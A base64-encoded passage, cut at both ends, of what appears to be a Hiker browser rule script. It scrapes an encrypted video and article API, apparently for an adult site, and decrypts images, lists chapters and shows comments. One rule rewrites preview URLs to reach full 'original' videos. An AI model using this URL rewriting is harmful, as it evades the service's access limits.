D0gYXBpdmlldy5EZWNyeXB0MSgnaHR0cHM6Ly9qbXRwLmdwZ3JlaWkuY29tJyArIGl0ZW0udGh1bWIpXFxcXG4gICAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBpdGVtLnRpdGxlLFxcXFxuICAgICAgICAgICAgICAgIGRlc2M6ICcwJyxcXFxcbiAgICAgICAgICAgICAgICBpbWc6IGltZyxcXFxcbiAgICAgICAgICAgICAgICB1cmw6IGBoaWtlcjovL3BhZ2UvZXJqaT9wYWdlPWZ5cGFnZSNub0hpc3RvcnkjI2dhbWVUaGVtZSNgLFxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnY2FyZF9waWNfMScsXFxcXG4gICAgICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgbW9kZWxfaWQ6IGl0ZW0ubW9kZWxfaWQsXFxcXG4gICAgICAgICAgICAgICAgICAgIGlkOiBpdGVtLmlkLFxcXFxuICAgICAgICAgICAgICAgICAgICBpbWc6IGltZ1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH0pXFxcXG4gICAgICAgIH0pXFxcXG4gICAgfSxcXFxcbiAgICB4aWV6aGVubWFuaHVheWlqaTogKGQsZGF0YSkgPT4ge1xcXFxuICAgICAgICBkYXRhLmZvckVhY2goaXRlbSA9PiB7XFxcXG4gICAgICAgICAgICB2YXIgaW1nID0gYXBpdmlldy5EZWNyeXB0MSgnaHR0cHM6Ly9qbXRwLmdwZ3JlaWkuY29tJyArIGl0ZW0udGh1bWIpXFxcXG4gICAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBpdGVtLnRpdGxlLFxcXFxuICAgICAgICAgICAgICAgIGRlc2M6ICcwJyxcXFxcbiAgICAgICAgICAgICAgICBpbWc6IGltZyxcXFxcbiAgICAgICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOi8vZW1wdHknICsgaXRlbS5pZCkucnVsZSgoKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHZhciBhcGl2aWV3ID0gJC5yZXF1aXJlKFxcXFxcXFwiaGFuc2h1XFxcXFxcXCIpXFxcXG4gICAgICAgICAgICAgICAgICAgIHZhciB1cmwgPSBhcGl2aWV3Lmhvc3QrJy92Mi41L3Nlcmllcy9jaGFwdGVycydcXFxcbiAgICAgICAgICAgICAgICAgICAgdmFyIGJvZHkgPSBhcGl2aWV3LkVuY3J5cHQoJ3Nlcmllc19pZD0nICsgTVlfVVJMLnJlcGxhY2UoJ2hpa2VyOi8vZW1wdHknLCAnJykpXFxcXG4gICAgICAgICAgICAgICAgICAgIHZhciBkYXRhID0gSlNPTi5wYXJzZShhcGl2aWV3LmdldGh0bWwodXJsLCBib2R5KSkuZGF0YTsgLy9sb2coZGF0YSlcXFxcbiAgICAgICAgICAgICAgICAgICAgdmFyIGQgPSBbXTtcXFxcbiAgICAgICAgICAgICAgICAgICAgZGF0YS5jaGFwdGVycy5mb3JFYWNoKGl0ZW0gPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGltZyA9IGFwaXZpZXcuRGVjcnlwdDEoJ2h0dHBzOi8vam10cC5ncGdyZWlpLmNvbScgKyBpdGVtLnRodW1iKVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogaXRlbS50aXRsZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZXNjOiBpdGVtLmRlc2NyaXB0aW9uLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGltZzogaW1nLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVybDogYGhpa2VyOi8vcGFnZS9lcmppP3BhZ2U9ZnlwYWdlI25vSGlzdG9yeSMjZ2FtZVRoZW1lI2AsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6ICdtb3ZpZV8xX2xlZnRfcGljJyxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtb2RlbF9pZDogMixcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWQ6IGl0ZW0uaWQsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGltZzogaW1nXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgICAgICAgICAgc2V0UmVzdWx0KGQpXFxcXG4gICAgICAgICAgICAgICAgfSksXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6ICdjYXJkX3BpY18xJ1xcXFxuICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgfSlcXFxcbiAgICB9LFxcXFxuICAgIHR1d2VuOiAoZCxkYXRhKSA9PiB7XFxcXG4gICAgICAgIHZhciBpbWdzID0gZGF0YS5jb250ZW50LnJlcGxhY2UoLyg8ZmlndXJlW1xcXFxcXFxcU1xcXFxcXFxcc10qPzxcXFxcXFxcXC9maWd1cmU+KS9nLCBcXFxcXFxcIkAkMUBcXFxcXFxcIik7XFxcXG4gICAgICAgIGltZ3Muc3BsaXQoXFxcXFxcXCJAXFxcXFxcXCIpLmZvckVhY2goaXQgPT4ge1xcXFxuICAgICAgICAgICAgaWYgKGl0LmluY2x1ZGVzKFxcXFxcXFwiZmlndXJlXFxcXFxcXCIpKSB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGltZyA9IGFwaXZpZXcuRGVjcnlwdDEoJ2h0dHBzOi8vam10cC5ncGdyZWlpLmNvbScgKyBwZGZoKGl0LCBcXFxcXFxcImltZyYmc3JjXFxcXFxcXCIpKVxcXFxuICAgICAgICAgICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgICAgIC8vZGVzYzogJzAnLFxcXFxuICAgICAgICAgICAgICAgICAgICBpbWc6IGltZyxcXFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiBpbWcsXFxcXG4gICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiAncGljXzFfZnVsbCdcXFxcbiAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgIH0gZWxzZSBpZiAoaXQudHJpbSgpKSB7XFxcXG4gICAgICAgICAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IGl0LFxcXFxuICAgICAgICAgICAgICAgICAgICB1cmw6ICdoaWtlcjovL2VtcHR5JyxcXFxcbiAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6ICdyaWNoX3RleHQnXFxcXG4gICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0pXFxcXG4gICAgfSxcXFxcbiAgICBiaWFvcWlhbjogKGQsZGF0YSkgPT4ge1xcXFxuICAgICAgICBkYXRhLnRhZ3MuZm9yRWFjaChpdGVtID0+IHtcXFxcbiAgICAgICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IGl0ZW0sXFxcXG4gICAgICAgICAgICAgICAgdXJsOiAkKGl0ZW0gKyAnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIC8vcHV0TXlWYXIoJ3NlYXJjaCcsIGlucHV0KVxcXFxuICAgICAgICAgICAgICAgICAgICAvL3JlZnJlc2hQYWdlKClcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcXFxuICAgICAgICAgICAgICAgIH0pLFxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnZmxleF9idXR0b24nXFxcXG4gICAgICAgICAgICB9KVxcXFxuICAgICAgICB9KVxcXFxuICAgIH0sXFxcXG4gICAgeXVsYW50dTogKGQsZGF0YSkgPT4ge1xcXFxuICAgICAgICBkYXRhLm11bHRpcGxlX3BpYy5mb3JFYWNoKGl0ZW0gPT4ge1xcXFxuICAgICAgICAgICAgbGV0IGltZyA9IGFwaXZpZXcuRGVjcnlwdDEoJ2h0dHBzOi8vam10cC5ncGdyZWlpLmNvbScgKyBpdGVtKVxcXFxuICAgICAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICBpbWc6IGltZyxcXFxcbiAgICAgICAgICAgICAgICB1cmw6IGltZyxcXFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ2NhcmRfcGljXzMnXFxcXG4gICAgICAgICAgICB9KVxcXFxuICAgICAgICB9KVxcXFxuICAgIH0sXFxcXG4gICAgcGluZ2x1bjogKGQsIGRhdGEpID0+IHtcXFxcbiAgICAgICAgZGF0YS5mb3JFYWNoKGRhdGEgPT4ge1xcXFxuICAgICAgICAgICAgaWYgKGRhdGEuYXV0aG9yKSB7XFxcXG4gICAgICAgICAgICAgICAgaWYgKGRhdGEuYXZhdGFyID09ICcnKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHZhciBhdmF0YXIgPSAnaHR0cHM6Ly9pbWcudmludWEuY24vaW1hZ2VzL0lubkRrLnRoLnBuZydcXFxcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgICAgICB2YXIgYXZhdGFyID0gYXBpdmlldy5EZWNyeXB0MSgnaHR0cHM6Ly9qbXRwLmdwZ3JlaWkuY29tJyArIGRhdGEuYXZhdGFyKVxcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogZGF0YS5hdXRob3IsXFxcXG4gICAgICAgICAgICAgICAgICAgIGRlc2M6IGRhdGEuY3JlYXRlZF9hdCxcXFxcbiAgICAgICAgICAgICAgICAgICAgaW1nOiBhdmF0YXIsXFxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogJ2hpa2VyOi8vZW1wdHknLFxcXFxuICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ2F2YXRhcidcXFxcbiAgICAgICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgICAgIGlmIChkYXRhLnJlcGxpZXMubGVuZ3RoICE9ICcwJykge1xcXFxuICAgICAgICAgICAgICAgICAgICB2YXIgdGl0bGUgPSBkYXRhLnRleHQgKyBhcGl2aWV3LmFkZHJlc3NUYWcoJ2hpa2VyOi8vcGFnZS9waW5sdW4nLCAnXFxcXFxcXFx0XFxcXFxcXFx0XFxcXFxcXFx05p+l55yL5YWo6YOoJylcXFxcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgICAgICB2YXIgdGl0bGUgPSBkYXRhLnRleHRcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IGFwaXZpZXcuZ3JheSh0aXRsZSksXFxcXG4gICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiAncmljaF90ZXh0JyxcXFxcbiAgICAgICAgICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBkYXRhLmF1dGhvcixcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGRlc2M6IGRhdGEuY3JlYXRlZF9hdCxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGRlc2MxOiBkYXRhLnRleHQsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBpbWc6IGF2YXRhcixcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGl0ZW06IGRhdGEucmVwbGllcyxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHBhZ2VUaXRsZTogZGF0YS5hdXRob3JcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0pXFxcXG4gICAgfVxcXFxufVxcXFxuXFxcXG4kLmV4cG9ydHMgPSBhcGl2aWV3O1xcXFxuXFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi54K55pKtXFxcIixcXFwicGF0aFxcXCI6XFxcImNsYTFcXFwiLFxcXCJydWxlXFxcIjpcXFwidmFyIGVuZERhdGUgPSBcXFxcXFxcIjIwMjEtMDktMDFcXFxcXFxcIjtcXFxcbnZhciBoZSA9IGFwaXZpZXcuZ2V0WWVhck1vbnRoQXJyYXkoZW5kRGF0ZSk7IC8vbG9nKGhlKSBcXFxcbnZhciBzdWJzID0gaGUgLy9sb2coc3VicykgXFxcXG5pZihNWV9QQUdFID09ICcxJyl7XFxcXG5oZS5mb3JFYWNoKCh4LGkpPT57XFxcXG4gICAgdmFyIGN0aXRsZSA9IHhcXFxcbiAgICB2YXIgc3ViID0gc3Vic1tpXVxcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBnZXRNeVZhcignY3RpdGxlJywgaGVbMF0pID09IGN0aXRsZSA/ICfigJzigJzigJ3igJ0nK2N0aXRsZS5mb250Y29sb3IoJyMnK2dldFJhbmdlQ29sb3JzKCkpOmN0aXRsZSxcXFxcbiAgICAgICAgdXJsOiAkKCcjbm9Mb2FkaW5nIyNub0hpc3RvcnkjJykubGF6eVJ1bGUoKGN0aXRsZSxzdWIpID0+IHtcXFxcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcImN0aXRsZVxcXFxcXFwiLCBjdGl0bGUpO1xcXFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwic3ViXFxcXFxcXCIsc3ViKTtcXFxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXFxcbiAgICAgICAgICAgIH0sIGN0aXRsZSxzdWIpLFxcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJzY3JvbGxfYnV0dG9uXFxcXFxcXCJcXFxcbiAgICB9KVxcXFxufSlcXFxcbn1cXFxcbnZhciBoZSA9IGdldE15VmFyKFxcXFxcXFwiY3RpdGxlXFxcXFxcXCIsaGVbMF0pXFxcXG52YXIgc3ViID0gZ2V0TXlWYXIoXFxcXFxcXCJzdWJcXFxcXFxcIixzdWJzWzBdKTsgLy9sb2coc3ViKVxcXFxuXFxcXG52YXIgdXJsID0gYXBpdmlldy5ob3N0KycvdjIuNS9hcnRpY2xlL2Rpc2NvdmVyeSdcXFxcbnZhciBib2R5ID0gYXBpdmlldy5FbmNyeXB0KCdtb2RlbF9pZD02JnB1Ymxpc2hlZF9hdD0nK3N1YisnJnBhZ2U9JytNWV9QQUdFKycmc2l6ZT0yMCZzb3J0PXB1Ymxpc2hlZF9hdCcpXFxcXG52YXIgZGF0YSA9IEpTT04ucGFyc2UoYXBpdmlldy5nZXRodG1sKHVybCxib2R5KSkuZGF0YTtcXFxcbmRhdGEuZm9yRWFjaChpdGVtID0+IHtcXFxcbiAgICB2YXIgaW1nID0gYXBpdmlldy5EZWNyeXB0MSgnaHR0cHM6Ly9qbXRwLmdwZ3JlaWkuY29tJyArIGl0ZW0udGh1bWIpXFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6IGl0ZW0udGl0bGUsXFxcXG4gICAgICAgIGRlc2M6ICcnLFxcXFxuICAgICAgICBpbWc6IGltZyxcXFxcbiAgICAgICAgdXJsOiBgaGlrZXI6Ly9wYWdlL2VyamkxP3BhZ2U9ZnlwYWdlI25vSGlzdG9yeSNgLFxcXFxuICAgICAgICBjb2xfdHlwZTogJ3BpY18xX2NhcmQnLFxcXFxuICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgbW9kZWxfaWQ6IGl0ZW0ubW9kZWxfaWQsXFxcXG4gICAgICAgICAgICBpZDogaXRlbS5pZCxcXFxcbiAgICAgICAgICAgIGltZzogaW1nXFxcXG4gICAgICAgIH1cXFxcbiAgICB9KVxcXFxufSlcXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLngrnmkq3kuoznuqdcXFwiLFxcXCJwYXRoXFxcIjpcXFwiZXJqaTFcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG52YXIgYXBpdmlldyA9ICQucmVxdWlyZShcXFxcXFxcImhhbnNodVxcXFxcXFwiKVxcXFxudmFyIG1vZGVsX2lkID0gTVlfUEFSQU1TLm1vZGVsX2lkOyAvL2xvZyh0eXBlb2YgbW9kZWxfaWQpXFxcXG52YXIgaWQgPSBNWV9QQVJBTVMuaWQ7IC8vbG9nKGlkKVxcXFxudmFyIGltZyA9IE1ZX1BBUkFNUy5pbWdcXFxcbnZhciBkID0gW107XFxcXG5pZihNWV9QQUdFID09ICcxJyl7XFxcXG5kLnB1c2goe1xcXFxuICAgIGRlc2M6ICcwJyxcXFxcbiAgICBpbWc6IGltZyxcXFxcbiAgICB1cmw6IGltZyxcXFxcbiAgICBjb2xfdHlwZTogJ2NhcmRfcGljXzEnXFxcXG59KVxcXFxuaWYoZ2V0TXlWYXIoJ2EnKSA9PSAnMScpe1xcXFxudmFyIHRpdGxlMSA9ICdcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHTlvbHniYfku4vnu41cXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHQnXFxcXG52YXIgdGl0bGUyID0gJ1xcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdOKAmOKAmOeUqOaIt+ivhOS7t+KAmeKAmVxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdCdcXFxcbn1lbHNle1xcXFxudmFyIHRpdGxlMSA9ICdcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHTigJjigJjlvbHniYfku4vnu43igJnigJlcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHQnXFxcXG52YXIgdGl0bGUyID0gJ1xcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdOeUqOaIt+ivhOS7t1xcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdCdcXFxcbn1cXFxcbmQucHVzaCh7XFxcXG4gICAgdGl0bGU6IHRpdGxlMSxcXFxcbiAgICB1cmw6ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKCk9PntcXFxcbiAgICAgICAgY2xlYXJNeVZhcignYScpXFxcXG4gICAgICAgIHJlZnJlc2hQYWdlKClcXFxcbiAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcXFxuICAgIH0pLFxcXFxuICAgIGNvbF90eXBlOiAnZmxleF9idXR0b24nLFxcXFxuICAgIC8vZXh0cmE6IHsnYmFja2dyb3VuZENvbG9yJzogJyNFMEY4RkYnfVxcXFxufSlcXFxcbmQucHVzaCh7XFxcXG4gICAgdGl0bGU6IHRpdGxlMixcXFxcbiAgICB1cmw6ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKCk9PntcXFxcbiAgICAgICAgcHV0TXlWYXIoJ2EnLCcxJylcXFxcbiAgICAgICAgcmVmcmVzaFBhZ2UoKVxcXFxuICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXG4gICAgfSksXFxcXG4gICAgY29sX3R5cGU6ICdmbGV4X2J1dHRvbicsXFxcXG4gICAgLy9leHRyYTogeydiYWNrZ3JvdW5kQ29sb3InOiAnI0UwRjhGRid9XFxcXG59KVxcXFxufVxcXFxuaWYoZ2V0TXlWYXIoJ2EnKSA9PSAnMScpe1xcXFxudmFyIHVybCA9IGFwaXZpZXcuaG9zdCsnL3YyLjUvY29tbWVudC9saXN0J1xcXFxudmFyIGJvZHkgPSBhcGl2aWV3LkVuY3J5cHQoJ2FydGljbGVfaWQ9JytpZCsnJnBhZ2U9JytNWV9QQUdFKycmc2l6ZT0yMCZzb3J0aW5nPScrZ2V0TXlWYXIoJ2ExJywnbGlrZXMnKSlcXFxcbnZhciBkYXRhID0gSlNPTi5wYXJzZShhcGl2aWV3LmdldGh0bWwodXJsLCBib2R5KSkuZGF0YTsgLy9sb2coZGF0YSlcXFxcbmlmKE1ZX1BBR0UgPT0gJzEnKXtcXFxcbmlmKGdldE15VmFyKCdhMScsJ2xpa2VzJykgPT0gJ2xpa2VzJyl7XFxcXG52YXIgdGV4dCA9ICflvZPliY3mjpLluo/vvJrmjInng63luqYnXFxcXG59XFxcXG5pZihnZXRNeVZhcignYTEnKSA9PSAnY3JlYXRlZF9hdCcpe1xcXFxudmFyIHRleHQgPSAn5b2T5YmN5o6S5bqP77ya5oyJ5pe26Ze0J1xcXFxufVxcXFxuLy9sb2coZ2V0TXlWYXIoJ2ExJywnbGlrZXMnKSlcXFxcbnZhciBwYWl4dSA9ICQoJyNub0xvYWRpbmcjJykuYjY0KCkubGF6eVJ1bGUoKCkgPT4ge1xcXFxuICAgIGlmKGdldE15VmFyKCdhMScsJ2xpa2VzJykgPT0gJ2xpa2VzJyl7XFxcXG4gICAgICAgIHB1dE15VmFyKCdhMScsJ2NyZWF0ZWRfYXQnKVxcXFxuICAgICAgICB0b2FzdCgn5oyJ5pe26Ze0JylcXFxcbiAgICAgICAgcmVmcmVzaFBhZ2UoKVxcXFxuICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXG4gICAgfVxcXFxuICAgIGlmKGdldE15VmFyKCdhMScpID09ICdjcmVhdGVkX2F0Jyl7XFxcXG4gICAgICAgIHB1dE15VmFyKCdhMScsJ2xpa2VzJylcXFxcbiAgICAgICAgdG9hc3QoJ+aMieeDreW6picpXFxcXG4gICAgICAgIHJlZnJlc2hQYWdlKClcXFxcbiAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcXFxuICAgIH1cXFxcbn0pXFxcXG5kLnB1c2goe1xcXFxuICAgIHRpdGxlOiBhcGl2aWV3LmJpZyhhcGl2aWV3LnN0cm9uZygn6K+E6K665YiX6KGoJykpKydcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHRcXFxcXFxcXHQnK2FwaXZpZXcuYWRkcmVzc1RhZyhwYWl4dSx0ZXh0KSxcXFxcbiAgICBjb2xfdHlwZTogJ3JpY2hfdGV4dCcsXFxcXG59KVxcXFxufVxcXFxuYXBpdmlldy5waW5nbHVuKGQsZGF0YSlcXFxcbn1lbHNle1xcXFxuaWYoTVlfUEFHRSA9PSAnMScpe1xcXFxudmFyIHVybCA9IGFwaXZpZXcuaG9zdCsnL3YyLjUvYXJ0aWNsZS9kZXRhaWwnXFxcXG52YXIgYm9keSA9IGFwaXZpZXcuRW5jcnlwdCgnaWQ9JytpZClcXFxcbnZhciBkYXRhID0gSlNPTi5wYXJzZShhcGl2aWV3LmdldGh0bWwodXJsLGJvZHkpKS5kYXRhOyAvL2xvZyhkYXRhKVxcXFxuZC5wdXNoKHtcXFxcbiAgICB0aXRsZTogJ1xcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdOmihOiniFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdCcsXFxcXG4gICAgdXJsOiAkKGRhdGEudmlkZW9fZmlsZSsnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoZGF0YSk9PntcXFxcbiAgICAgICAgcmV0dXJuICdodHRwczovL2FrbWFpdmlkZW8uY2RjaHVhbmdhby5jb20nK2lucHV0XFxcXG4gICAgfSxkYXRhKSxcXFxcbiAgICBjb2xfdHlwZTogJ3RleHRfMicsXFxcXG4gICAgLy9leHRyYTogeydiYWNrZ3JvdW5kQ29sb3InOiAnI0UwRjhGRid9XFxcXG59KVxcXFxuZC5wdXNoKHtcXFxcbiAgICB0aXRsZTogJ1xcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdOWOn+eJh1xcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdCcsXFxcXG4gICAgdXJsOiAkKGRhdGEudmlkZW9fZmlsZSsnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoZGF0YSk9PntcXFxcbiAgICAgICAgaWYoL3NhbXBsZS8udGVzdChpbnB1dCkpe1xcXFxuICAgICAgICAgICAgdmFyIHVybCA9IGlucHV0LnJlcGxhY2UoL1teYS16QS1aMC05XShzYW1wbGUpLywnJylcXFxcbiAgICAgICAgICAgIHJldHVybiAnaHR0cHM6Ly9ha21haXZpZGVvLmNkY2h1YW5nYW8uY29tJyt1cmxcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBpZighL+aXoC8udGVzdChkYXRhLm51bWJlcikpe1xcXFxuICAgICAgICAgICAgdmFyIHVybCA9IGlucHV0LnJlcGxhY2UoL1xcXFxcXFxcLyhbXlxcXFxcXFxcL10rKVxcXFxcXFxcLi8sJy8nK2RhdGEubnVtYmVyKycuJylcXFxcbiAgICAgICAgICAgIHJldHVybiAnaHR0cHM6Ly9ha21haXZpZGVvLmNkY2h1YW5nYW8uY29tJyt1cmxcXFxcbiAgICAgICAgfVxcXFxuICAgIH0sZGF0YSksXFxcXG4gICAgY29sX3R5cGU6ICd0ZXh0XzInLFxcXFxuICAgIC8vZXh0cmE6IHsnYmFja2dyb3VuZENvbG9yJzogJyNFMEY4RkYnfVxcXFxufSlcXFxcbmQucHVzaCh7XFxcXG4gICAgdGl0bGU6IGFwaXZpZXcuYmlnKGFwaXZpZXcuc3Ryb25nKGRhdGEudGl0bGUpKSsnPGJyPjxicj4nKyfnlarlj7fvvJonK2FwaXZpZXcuZ3JheShkYXRhLm51bWJlcikrJ1xcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdCcrJ+a8lOWRmO+8micrYXBpdmlldy5ncmF5KGRhdGEuYWN0b3IpKyc8YnI+JythcGl2aWV3LmdyYXkoZGF0YS5wdWJsaXNoZWRfYXQuc3BsaXQoJyAnKVswXSkrJ1xcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdCcrYXBpdmlldy5ncmF5KGRhdGEubGVuZ3RoKSsnXFxcXFxcXFx0XFxcXFxcXFx0XFxcXFxcXFx0JythcGl2aWV3LmdyYXkoZGF0YS5zaXplKSsnXFxcXFxcXFx0XFxcXFxcXFx0XFxcXFxcXFx0JythcGl2aWV3LmdyYXkoZGF0YS5xdWFsaXR5KSxcXFxcbiAgICB1cmw6ICdoaWtlcjovL2VtcHR5JyxcXFxcbiAgICBjb2xfdHlwZTogJ3JpY2hfdGV4dCdcXFxcbn0pXFxcXG5hcGl2aWV3LmJpYW9xaWFuKGQsZGF0YSlcXFxcbmFwaXZpZXcueXVsYW50dShkLGRhdGEpXFxcXG4vL2xvZyhkYXRhLmNvbnRlbnQpXFxcXG5hcGl2aWV3LnR1d2VuKGQsZGF0YSlcXFxcblxcXFxufVxcXFxufVxcXFxuXFxcXG5zZXRSZXN1bHQoZClcXFxcblxcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuivhOiuuuivpuaDhVxcXCIsXFxcInBhdGhcXFwiOlxcXCJwaW5sdW5cXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG52YXIgYXBpdmlldyA9ICQucmVxdWlyZShcXFxcXFxcImhhbnNodVxcXFxcXFwiKVxcXFxudmFyIGQgPSBbXTtcXFxcbmQucHVzaCh7XFxcXG4gICAgdGl0bGU6IE1ZX1BBUkFNUy50aXRsZSxcX